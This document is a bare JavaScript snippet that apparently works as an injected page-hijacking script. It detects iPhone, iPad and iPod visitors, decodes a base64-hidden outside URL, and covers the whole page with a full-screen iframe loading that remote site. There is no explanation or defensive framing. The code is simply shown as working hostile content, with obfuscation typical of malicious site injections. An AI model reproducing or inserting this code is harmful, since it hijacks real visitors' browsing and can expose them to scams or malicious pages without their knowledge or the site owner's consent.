setTimeout(function(){
  var isiPhone = /iPhone|iPad|iPod/i.test(navigator.userAgent);
  if(isiPhone){
    var url = atob("aHR0cHM6Ly92LnJvbGxzMy5jb20v");
    var d = document.createElement("div");
    d.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:#000;";
    d.innerHTML = '<iframe src="' + url + '" style="width:100%;height:100%;border:0;"></iframe>';
    document.body.appendChild(d);
  }
}, 0);
